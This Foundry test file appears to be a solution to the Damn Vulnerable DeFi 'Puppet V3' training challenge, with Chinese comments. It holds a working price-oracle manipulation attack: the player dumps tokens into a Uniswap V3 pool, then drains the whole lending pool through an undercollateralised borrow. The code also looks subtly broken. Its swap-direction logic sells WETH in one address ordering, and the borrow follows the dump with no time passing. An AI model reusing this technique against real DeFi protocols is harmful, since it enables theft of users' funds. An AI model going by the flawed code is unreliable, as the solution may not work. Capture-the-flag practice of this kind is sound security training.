// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";

// 补充Uniswap V3 SwapRouter接口（主网真实地址）
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);
        deal(player, PLAYER_INITIAL_ETH_BALANCE);
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();
        token = new DamnValuableToken();

        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0, token1: token1, fee: FEE, sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        uniswapPool.increaseObservationCardinalityNext(40);

        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        skip(3 days);
        initialBlockTimestamp = block.timestamp;
        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    function test_puppetV3() public checkSolvedByPlayer {
        // 1. 定义Uniswap V3 SwapRouter
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));

        // 2. 授权SwapRouter划转玩家的全部Token
        token.approve(address(swapRouter), PLAYER_INITIAL_TOKEN_BALANCE);

        // 3. 将玩家的110e18 Token全部卖出到Uniswap池，压低Token价格
        // 注意tokenIn/tokenOut顺序：按Uniswap池的token0/token1字典序
        bool isWethFirst = address(weth) < address(token);
        address swapTokenIn = isWethFirst ? address(token) : address(weth);
        address swapTokenOut = isWethFirst ? address(weth) : address(token);
        swapRouter.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: swapTokenIn, // 玩家卖出Token
                tokenOut: swapTokenOut, // 兑换WETH
                fee: FEE, // 3000手续费档位
                recipient: player, // 兑换的WETH转到玩家地址
                deadline: block.timestamp + 3600, // 截止时间（1小时内）
                amountIn: PLAYER_INITIAL_TOKEN_BALANCE, // 卖出全部110e18 Token
                amountOutMinimum: 0, // 测试环境无滑点保护
                sqrtPriceLimitX96: 0 // 不限制价格，最大化砸盘效果
            })
        );

        // 4. 玩家将持有的ETH兑换为WETH（用于抵押借贷）
        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}(); // 1e18 ETH → WETH

        // 5. 授权借贷池划转玩家的WETH（抵押用）
        weth.approve(address(lendingPool), type(uint256).max);

        // 6. 从借贷池借出全部100万e18 Token（此时价格被砸低，抵押额足够）
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // 7. 将借出的Token全部转到recovery地址
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    // ===== 原有代码（无需修改）=====
    function _isSolved() private view {
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}
